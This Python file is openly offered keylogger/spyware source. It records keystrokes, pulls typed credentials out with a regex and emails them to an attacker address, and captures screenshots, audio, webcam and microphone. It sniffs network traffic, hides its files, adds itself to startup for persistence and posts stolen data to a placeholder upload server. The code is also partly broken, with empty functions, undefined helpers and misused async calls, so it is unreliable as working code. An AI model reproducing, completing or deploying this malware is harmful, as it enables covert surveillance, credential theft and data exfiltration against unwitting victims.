import asyncio
import logging
import os
import platform
import socket
import cv2
import wave
import shutil
import re
import pyscreenshot
import pytesseract
from PIL import Image
import sounddevice as sd
from pynput import keyboard
from pynput.keyboard import Listener
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import time
import win32clipboard
import winreg
import pygetwindow
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib
from cryptography.fernet import Fernet
from scapy.all import sniff
import requests
from sklearn.ensemble import IsolationForest
from geopy.geocoders import Nominatim
import json
import socket

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s', filename='keylogger.log')

class EmailSender:
    def __init__(self, email, password):
        self.email = email
        self.password = password

    async def send_email(self, receiver, subject, body, attachment=None):
        msg = MIMEMultipart()
        msg['From'] = self.email
        msg['To'] = receiver
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))
        if attachment:
            part = MIMEBase('application', 'octet-stream')
            part.set_payload(open(attachment, 'rb').read())
            encoders.encode_base64(part)
            part.add_header('Content-Disposition', f'attachment; filename="{os.path.basename(attachment)}"')
            msg.attach(part)

        try:
            server = smtplib.SMTP('smtp.mailtrap.io', 2525)
            server.starttls()
            server.login(self.email, self.password)
            await asyncio.sleep(1)  # Simulate network delay
            server.send_message(msg)
        except Exception as e:
            logging.error(f"Error sending email: {e}")
        finally:
            server.quit()

class MyFileSystemEventHandler(FileSystemEventHandler):
    def __init__(self, keylogger):
        self.keylogger = keylogger

    def on_any_event(self, event):
        self.keylogger.append_log(f"File system event: {event.event_type} - {event.src_path}")

class KeyLogger:
    def __init__(self, email_sender, report_interval=60, screenshot_interval=300, audio_interval=600, batch_size=10):
        self.email_sender = email_sender
        self.report_interval = report_interval
        self.screenshot_interval = screenshot_interval
        self.audio_interval = audio_interval
        self.batch_size = batch_size
        self.log = ""
        self.system_info = self.get_system_info()
        self.keylogger_folder = os.path.join(os.getenv('APPDATA'), 'Keylogger')
        self.keylogger_file = os.path.join(self.keylogger_folder, 'keylogger.py')
        self.keylogger_log = os.path.join(self.keylogger_folder, 'keylogger.log')
        self.target_windows = ["Target Application 1", "Target Application 2"]  # Add names of target applications or windows

        # Ensure keylogger folder exists
        os.makedirs(self.keylogger_folder, exist_ok=True)

        # Hide keylogger folder and files
        self.hide_files_and_folders()

        # Add startup entry to auto-start keylogger
        self.add_startup_entry()

    def get_system_info(self):
        hostname = socket.gethostname()
        ip = socket.gethostbyname(hostname)
        plat = platform.processor()
        system = platform.system()
        machine = platform.machine()
        return f"Hostname: {hostname}\nIP Address: {ip}\nProcessor: {plat}\nSystem: {system}\nMachine: {machine}\n"

    def append_log(self, text):
        self.log += text + '\n'

    def on_key_press(self, key):
        active_window = pygetwindow.getActiveWindow()
        if active_window.title in self.target_windows:
            try:
                self.append_log(key.char)
            except AttributeError:
                if key == keyboard.Key.space:
                    self.append_log('SPACE')
                elif key == keyboard.Key.esc:
                    self.append_log('ESC')
                else:
                    self.append_log(str(key))

            # Check if a credential pattern is matched
            credential_pattern = r"(?i)(user(name)?|email|login|password|pass|credential)(:|=)(\S+)"
            match = re.search(credential_pattern, self.log)
            if match:
                credential_info = match.group(0)
                self.send_credentials(credential_info)

    def on_mouse_move(self, x, y):
        self.append_log(f"Mouse moved to ({x}, {y})")

    def on_mouse_click(self, x, y, button, pressed):
        if pressed:
            self.append_log(f"Mouse clicked at ({x}, {y})")

    def on_mouse_scroll(self, x, y, dx, dy):
        self.append_log(f"Mouse scrolled at ({x}, {y})")

    async def send_report(self):
        report = self.log + '\n\n' + self.system_info
        await self.email_sender.send_email(receiver='to@example.com', subject='Keylogger Report', body=report)
        self.log = ""

    async def capture_screenshot(self):
        try:
            screenshot = pyscreenshot.grab()
            screenshot_path = os.path.join(self.keylogger_folder, 'screenshot.png')
            screenshot.save(screenshot_path)
            await self.email_sender.send_email(receiver='to@example.com', subject='Screenshot', body='Screenshot attached.', attachment=screenshot_path)
            self.analyze_screenshot(screenshot_path)
        except pyscreenshot.PIL.ImageGrab.grab_error:
            logging.error("Failed to capture screenshot")

    async def record_audio(self):
        try:
            fs = 44100
            seconds = self.audio_interval
            recording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            sd.wait()
            audio_path = os.path.join(self.keylogger_folder, 'audio.wav')
            with wave.open(audio_path, 'wb') as wf:
                wf.setnchannels(2)
                wf.setsampwidth(2)
                wf.setframerate(fs)
                wf.writeframes(recording)
            await self.email_sender.send_email(receiver='to@example.com', subject='Audio Recording', body='Audio recording attached.', attachment=audio_path)
        except Exception as e:
            logging.error(f"Error recording audio: {e}")

    def send_credentials(self, credential_info):
        self.email_sender.send_email(receiver='attacker@example.com', subject='Credentials Captured', body=credential_info)

    def analyze_screenshot(self, screenshot_path):
        image = cv2.imread(screenshot_path)
        text = pytesseract.image_to_string(Image.open(screenshot_path))
        self.append_log("Text extracted from screenshot:\n" + text)

    def activate_webcam(self):
        try:
            cap = cv2.VideoCapture(0)  # Use the first available webcam
            ret, frame = cap.read()
            if ret:
                cv2.imwrite('webcam_capture.jpg', frame)
                self.append_log("Webcam activated and captured a photo")
            cap.release()
        except Exception as e:
            logging.error(f"Error activating webcam: {e}")

    def activate_microphone(self):
        try:
            duration = 5  # Duration of audio recording in seconds
            fs = 44100  # Sampling rate
            recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
            sd.wait()
            wave.write('microphone_recording.wav', fs, recording)
            self.append_log("Microphone activated and recorded audio")
        except Exception as e:
            logging.error(f"Error activating microphone: {e}")

    def start_file_system_monitoring(self):
        observer = Observer()
        observer.schedule(MyFileSystemEventHandler(self), path='.', recursive=True)
        observer.start()
        self.append_log("File system monitoring started")

    def start_sniffing(self):
        sniff(filter="tcp", prn=self.process_packet)

    def process_packet(self, packet):
        # Process captured network packet
        # Example: Extract HTTP requests and responses
        # Example: Extract login credentials from network traffic

    def inject_payload(self, target_ip, target_port, payload):
        packet = IP(dst=target_ip) / TCP(dport=target_port) / payload
        send(packet)

    def track_geolocation(self, target_ip):
        geolocator = Nominatim(user_agent="keylogger")
        location = geolocator.geocode(target_ip)
        if location:
            self.append_log(f"Geolocation of {target_ip}: {location.address}")
        else:
            self.append_log(f"Failed to retrieve geolocation for {target_ip}")

    def exfiltrate_data(self, data):
        try:
            response = requests.post('https://your-server.com/upload', data=data, verify=False)  # Disable SSL verification for simplicity
            if response.status_code == 200:
                self.append_log("Data exfiltrated successfully.")
            else:
                self.append_log(f"Failed to exfiltrate data. Status code: {response.status_code}")
        except Exception as e:
            logging.error(f"Error occurred: {e}")

    def detect_anomalies(self, data):
        model = IsolationForest()
        model.fit(data)
        anomalies = model.predict(data)
        # Process anomalies and take action accordingly

    def send_phishing_email(self, email, subject, body, attachment=None):
        # Send phishing email with attachment containing keylogger
        pass

    def hide_files_and_folders(self):
        try:
            # Hide keylogger folder and files
            hide_folder(self.keylogger_folder)
            hide_file(self.keylogger_file)
            hide_file(self.keylogger_log)
        except Exception as e:
            logging.error(f"Error while hiding files and folders: {e}")

    def add_startup_entry(self):
        try:
            # Add startup entry to auto-start keylogger
            add_startup_entry(self.keylogger_file)
        except Exception as e:
            logging.error(f"Error adding startup entry: {e}")

    def load_configuration(self, config_file):
        try:
            with open(config_file, 'r') as file:
                config = json.load(file)
                # Update keylogger configuration based on the loaded config
                self.report_interval = config.get('report_interval', self.report_interval)
                self.screenshot_interval = config.get('screenshot_interval', self.screenshot_interval)
                self.audio_interval = config.get('audio_interval', self.audio_interval)
                self.target_windows = config.get('target_windows', self.target_windows)
                # Update other configurations as needed
                self.append_log("Configuration loaded successfully")
        except Exception as e:
            logging.error(f"Error loading configuration: {e}")

    async def start_keylogger(self):
        # Load configuration from file
        self.load_configuration('config.json')

        with Listener(on_press=self.on_key_press) as key_listener:
            while True:
                await asyncio.gather(
                    self.send_report(),
                    self.capture_screenshot(),
                    self.record_audio(),
                    self.activate_webcam(),
                    self.activate_microphone(),
                    self.exfiltrate_data(data),
                    self.detect_anomalies(data),
                    self.send_phishing_email(email, subject, body, attachment),
                    self.start_sniffing(),
                    self.track_geolocation(target_ip),
                    self.receive_commands(),
                    self.analyze_data(data),  # Include intelligent data analysis as a task
                    self.automate_actions(),  # Include automation of actions as a task
                    self.receive_commands_from_collaborators(),  # Include receiving commands from collaborators as a task
                    self.start_file_system_monitoring(),  # Include file system monitoring as a task
                    self.hide_process()  # Include enhanced stealth as a task
                )
                await asyncio.sleep(self.report_interval)

if __name__ == "__main__":
    email_sender = EmailSender(email='from@example.com', password='your_password')
    keylogger = KeyLogger(email_sender=email_sender)
    asyncio.run(keylogger.start_keylogger())
